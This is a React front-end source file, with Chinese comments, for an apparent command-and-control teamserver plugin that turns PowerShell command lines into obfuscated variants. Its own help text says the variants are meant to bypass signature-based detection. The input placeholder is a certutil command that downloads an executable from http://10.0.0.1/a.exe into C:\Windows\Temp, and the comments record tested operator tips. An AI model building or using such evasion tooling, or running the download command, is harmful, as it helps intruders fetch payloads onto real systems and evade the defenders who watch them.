import { useEffect, useMemo, useState } from 'react'
import { useStore } from '../store'
import { copyText } from '../utils'
import { PageTips } from './PageTips'

/**
 * 参数混淆（Invoke-ArgFuscator）。
 *
 * 真正的混淆跑在**服务端**：那里装了 pwsh，也有 156 个命令的参数模型表。
 * 本页只负责收集输入、把服务端给的变体原样展示、逐条复制。
 *
 * 页面上那几条提示不是抄文档来的，是实测出来的行为，每条都能复现 —— 它们
 * 对应的是「操作员一定会踩、而报错信息不会告诉他为什么」的三个坑：
 *
 *  1. 只认**裸命令名**。上游是拿第一个词去拼 models/<词>.json，所以
 *     `C:\Windows\System32\certutil.exe` 会去找
 *     models/C:/Windows/System32/certutil.exe.json，然后报「命令找不到」。
 *  2. 命令**至少要有一个参数**。实测 ipconfig / netstat / arp / whoami 裸调用
 *     全部失败（模块内部抛 "Cannot index into a null array"），各加一个参数
 *     就全部正常，4/4 一致。
 *  3. 第一个词得在模型表里（156 个）。这一条服务端会返回命令清单，所以能
 *     在**点按钮之前**就提示，而不是让操作员等 1.5 秒换一句报错。
 */
type Status = {
  available?: boolean
  reason?: string
  pwsh?: string
  pwsh_version?: string
  module_dir?: string
  models?: number
  commands?: string[]
  platforms?: string[]
  max_variants?: number
  timeout_sec?: number
}

const PLATFORMS = ['windows', 'linux', 'mac']

/** 与后端 firstToken 同一口径：按空白切第一个词。 */
function firstToken(s: string): string {
  return (s.trim().split(/\s+/)[0] || '')
}

export function ArgFuscator() {
  const api = useStore((s) => s.api)
  const pushLog = useStore((s) => s.pushLog)
  const pushToast = useStore((s) => s.pushToast)

  const [status, setStatus] = useState<Status | null>(null)
  const [pluginMissing, setPluginMissing] = useState(false)
  const [statusErr, setStatusErr] = useState('')

  const [command, setCommand] = useState('')
  const [platform, setPlatform] = useState('windows')
  const [n, setN] = useState(1)

  const [busy, setBusy] = useState(false)
  const [err, setErr] = useState('')
  const [variants, setVariants] = useState<string[]>([])
  const [ms, setMs] = useState<number | null>(null)

  const maxVariants = status?.max_variants && status.max_variants > 0 ? status.max_variants : 5
  const known = useMemo(
    () => new Set((status?.commands || []).map((c) => c.toLowerCase())),
    [status],
  )

  useEffect(() => {
    let alive = true
    ;(async () => {
      try {
        const st = await api.argFuscatorStatus()
        if (!alive) return
        setStatus(st)
        if (st?.max_variants) setN((v) => Math.min(v, st.max_variants as number))
      } catch (e: any) {
        if (!alive) return
        const msg = e?.message || String(e)
        // 与 WebDelivery 同一判据：路由不存在时 http.ts 抛 non-JSON（有些
        // 部署下静态兜底会以 200 + HTML 应答，所以不能只看状态码）。
        if (/404|not found|no route|argfuscator/i.test(msg) || /non-JSON/i.test(msg)) {
          setPluginMissing(true)
          setStatusErr('argfuscator 插件未加载或路由不可用')
        } else {
          setStatusErr(`状态拉取失败: ${msg}`)
          pushLog('err', `argfuscator status: ${msg}`)
        }
      }
    })()
    return () => { alive = false }
  }, [api, pushLog])

  const tok = firstToken(command)
  const tooLong = command.length > 4096
  const hasPath = /[\\/]/.test(tok) && tok.length > 1
  const singleToken = command.trim().length > 0 && !/\s/.test(command.trim())
  const unknownCmd = !!tok && known.size > 0 && !hasPath && !known.has(tok.toLowerCase())

  // 模块**原样保留**输入的分词。实测：`… C:\Windows\Temp\A.exe` 产出的每个变体是
  // 6 个 token；`… C: \Windows\Temp\A.exe`（盘符后多一个空格）产出 7 个。差的那个
  // 参数会被一路混淆下去，而变体本来就是乱码 —— 操作员没有任何办法看出来。
  // 单独成词的盘符（`C:`）是这件事在输入侧唯一可靠的征兆。
  const argv = command.trim() ? command.trim().split(/\s+/) : []
  const splitDrive = argv.find((t) => /^[A-Za-z]:$/.test(t))

  async function gen() {
    setErr('')
    setBusy(true)
    try {
      const r = await api.argFuscatorGenerate({ command, platform, n })
      const vs = Array.isArray(r?.variants) ? r.variants.filter((v) => v && v.trim()) : []
      if (!vs.length) {
        setVariants([])
        setErr('服务端没有返回任何变体')
      } else {
        setVariants(vs)
        setMs(typeof r?.ms === 'number' ? r.ms : null)
      }
    } catch (e: any) {
      setVariants([])
      setMs(null)
      // 服务端的 message 已经是人话（含我们翻译过的上游报错），直接展示。
      setErr(e?.message || String(e))
      pushLog('err', `参数混淆失败: ${e?.message || e}`)
    } finally {
      setBusy(false)
    }
  }

  async function copyOne(v: string, i: number) {
    const ok = await copyText(v)
    pushToast(ok ? 'ok' : 'err', ok ? `已复制变体 ${i + 1}` : '复制失败')
  }

  async function copyAll() {
    if (!variants.length) return
    const ok = await copyText(variants.join('\n'))
    pushToast(ok ? 'ok' : 'err', ok ? `已复制 ${variants.length} 个变体` : '复制失败')
  }

  const canRun = !!command.trim() && !tooLong && !busy && !pluginMissing && status?.available !== false

  return (
    <div className="gen-page">
      <div className="gen-layout">
        <div className="gen-main card">
          <div className="card-hd">
            <h3>参数混淆 · PowerShell 命令行变形</h3>
            <span className="spacer" />
            <span className="dim" style={{ fontSize: 12 }}>服务端 pwsh 执行</span>
            <PageTips id="argfuscator">
              <p>把一条 PowerShell 命令的<b>参数写法</b>打乱重排，生成语义等价但字面不同的多个变体，
                用于绕过基于特征串的检测。</p>
              <p>只混淆<b>写法</b>，不改变命令做什么 —— 变体与被混淆的命令等价。</p>
              <p>第一个词必须是<b>裸命令名</b>（<code>certutil</code>，不是完整路径），
                且命令<b>至少要带一个参数</b>。</p>
            </PageTips>
          </div>
          <div className="card-bd gen-body">
            {pluginMissing && (
              <div className="hint warn-hint" style={{ marginBottom: 12 }}>
                服务端未加载 <b>argfuscator</b> 插件（<code>extenders/argfuscator/</code>）。
                确认 profile 已启用该 service，且 <code>vendor_ps/</code> 与 so 同目录后可重启 teamserver。
              </div>
            )}

            {status && status.available === false && (
              <div className="hint warn-hint" style={{ marginBottom: 12 }}>
                服务端没有可用的 <b>pwsh</b>：{status.reason || '原因未知'}。
                插件已加载，但生成一定失败。
              </div>
            )}

            <div className="gen-section-title">1. 待混淆的命令</div>
            <div className="field">
              <label>PowerShell 命令</label>
              <textarea
                className="axf-input"
                rows={4}
                value={command}
                onChange={(e) => setCommand(e.target.value)}
                placeholder="certutil -urlcache -split -f http://10.0.0.1/a.exe C:\Windows\Temp\a.exe"
                spellCheck={false}
              />
              <div className="dim" style={{ fontSize: 12, marginTop: 4 }}>
                {command.length} 字节
                {/* 参数个数：变体的参数个数与这里**严格相等**（实测），多出来的一定是输入里多打了空格 */}
                {argv.length > 0 && <span> · {argv.length} 个参数</span>}
                {tooLong && <b className="axf-bad"> · 超过 4096 上限</b>}
                <span> · 支持多行</span>
              </div>
            </div>

            {/* 三条都指向「点了按钮也一定失败」的输入，所以放在按钮**之前**说。 */}
            {hasPath && (
              <div className="hint warn-hint" style={{ marginTop: 8 }}>
                第一个词 <code>{tok}</code> 看起来是路径。服务端只认<b>裸命令名</b> —— 完整路径会去查
                <code> models/{tok}.json</code> 然后报「命令找不到」。改成 <code>{tok.split(/[\\/]/).pop()}</code> 再试。
              </div>
            )}
            {splitDrive && (
              <div className="hint warn-hint" style={{ marginTop: 8 }}>
                <code>{splitDrive}</code> 单独成了一个参数 —— 盘符后面多半多打了一个空格。
                模块会把这个空格<b>一起混淆下去</b>，产出的命令因此比预期多一个参数
                （实测 7 个而不是 6 个），而变体本身是乱码，看不出来。
                另外 Windows 也解析不了盘符后带空格的路径：实测
                <code> C: \Windows\Temp\A.exe</code> 找不到文件，去掉那个空格就能找到。
              </div>
            )}
            {singleToken && !hasPath && (
              <div className="hint warn-hint" style={{ marginTop: 8 }}>
                命令只有一个词。服务端模块要求<b>至少一个参数</b>才能解析
                （实测裸 <code>ipconfig</code> / <code>netstat</code> / <code>arp</code> / <code>whoami</code> 都会失败，
                各补一个参数即正常）。例如 <code>{tok} /all</code>。
              </div>
            )}
            {unknownCmd && (
              <div className="hint warn-hint" style={{ marginTop: 8 }}>
                <code>{tok}</code> 不在服务端的 {status?.models ?? 0} 个参数模型里，生成大概率失败。
                <span className="dim">（只比对第一个词，大小写不敏感）</span>
              </div>
            )}

            <div className="gen-section-title">2. 变形参数</div>
            <div className="field-grid-2">
              <div className="field">
                <label>平台</label>
                <select value={platform} onChange={(e) => setPlatform(e.target.value)}>
                  {PLATFORMS.map((p) => <option key={p} value={p}>{p}</option>)}
                </select>
              </div>
              <div className="field">
                <label>变体数量（上限 {maxVariants}）</label>
                <input
                  type="number"
                  min={1}
                  max={maxVariants}
                  value={n}
                  onChange={(e) => {
                    const v = parseInt(e.target.value, 10)
                    setN(Number.isFinite(v) ? v : 1)
                  }}
                />
              </div>
            </div>

            <div className="axf-run">
              <button type="button" className="primary" disabled={!canRun} onClick={gen}>
                {busy ? '生成中…' : `生成 ${Number.isFinite(n) && n > 0 ? n : 1} 个变体`}
              </button>
              {ms !== null && !busy && <span className="dim" style={{ fontSize: 12 }}>耗时 {ms} ms</span>}
            </div>

            {err && (
              <div className="hint warn-hint" style={{ marginTop: 10, whiteSpace: 'pre-wrap' }}>{err}</div>
            )}

            {variants.length > 0 && (
              <>
                <div className="gen-section-title axf-res-hd">
                  <span>3. 结果 · {variants.length} 个变体</span>
                  <button type="button" className="ghost" onClick={copyAll}>复制全部</button>
                </div>
                <div className="axf-list">
                  {variants.map((v, i) => (
                    <div className="axf-item" key={i}>
                      <div className="axf-item-hd">
                        <span className="axf-n">#{i + 1}</span>
                        <span className="spacer" />
                        <button type="button" className="ghost" onClick={() => copyOne(v, i)}>复制</button>
                      </div>
                      {/* pre-wrap：多行命令是合法的，变体内部的换行属于内容，不能折叠 */}
                      <pre className="axf-cmd">{v}</pre>
                    </div>
                  ))}
                </div>
              </>
            )}
          </div>
        </div>

        <div className="gen-side card">
          <div className="card-hd"><h3>服务端状态</h3></div>
          <div className="card-bd gen-body">
            {statusErr && !pluginMissing && (
              <div className="hint warn-hint" style={{ marginBottom: 10 }}>{statusErr}</div>
            )}
            {/* .kv 是「两列网格」，子元素必须是 div；一行放两对，不是一对一个 .kv */}
            <div className="kv">
              <div>
                <span className="k">pwsh</span>
                <span>{status?.pwsh_version || (status?.available === false ? '不可用' : '—')}</span>
              </div>
              <div>
                <span className="k">参数模型</span>
                <span>{status?.models ?? '—'} 个命令</span>
              </div>
              <div>
                <span className="k">变体上限</span>
                <span>{maxVariants}</span>
              </div>
              <div>
                <span className="k">超时</span>
                <span>{status?.timeout_sec ?? '—'} s</span>
              </div>
              <div className="full">
                <span className="k">pwsh 路径</span>
                <span className="axf-path">{status?.pwsh || '—'}</span>
              </div>
              {status?.module_dir && (
                <div className="full">
                  <span className="k">模块目录</span>
                  <span className="axf-path">{status.module_dir}</span>
                </div>
              )}
            </div>

            <div className="hint muted-hint" style={{ marginTop: 12 }}>
              混淆质量取决于服务端的参数模型表（{status?.models ?? 0} 个命令）。
              不在表里的命令无法混淆，只能改用等价的其他命令。
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
